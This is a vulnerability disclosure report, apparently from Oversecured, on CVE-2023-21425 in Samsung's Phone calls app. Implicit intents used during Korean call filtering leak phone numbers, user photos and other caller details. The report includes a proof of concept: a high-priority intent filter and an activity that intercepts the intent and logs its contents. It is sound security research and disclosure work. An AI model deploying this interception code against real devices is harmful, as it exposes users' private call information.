# Details

<table>
    <tr>
        <td>Name</td>
        <td>Phone calls</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.android.server.telecom</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.15</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.01.04</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-21425">CVE-2023-21425</a> (SVE-2022-2261)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$370</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/111.%20Phone%20calls%20—%20Korea%20-%20Leakage%20of%20call%20info%20when%20using%20filtering/Oversecured_report.png)

Oversecured found the Phone calls app using implicit intents in the `com/samsung/server/telecom/advancedcall/assisteddialing/korea/SamsungKoreaRadOutgoingCallFiltering.java` file when the Korean user was using call filtering. These intents disclosed sensitive information about the call being made, such as phone numbers, the user's photo, and other additional information about the user present on the phone.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="com.skt.prod.phone.action.CALL" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

File `InterceptActivity.java`:
```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    DumpUtils.dump(getIntent(), getForeignClassLoader(getCallingPackage()));
    finish();
}

private ClassLoader getForeignClassLoader(String packageName) {
    try {
        return createPackageContext(packageName, CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY)
                .getClassLoader();
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.

## References

- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)
- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
